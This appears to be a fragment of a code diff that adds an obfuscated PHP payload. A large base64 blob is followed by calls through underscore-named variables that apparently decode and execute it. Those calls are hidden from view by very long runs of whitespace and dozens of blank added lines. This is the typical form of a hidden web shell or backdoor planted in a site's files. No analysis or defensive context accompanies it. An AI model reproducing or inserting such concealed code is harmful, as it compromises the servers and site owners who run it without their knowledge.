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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
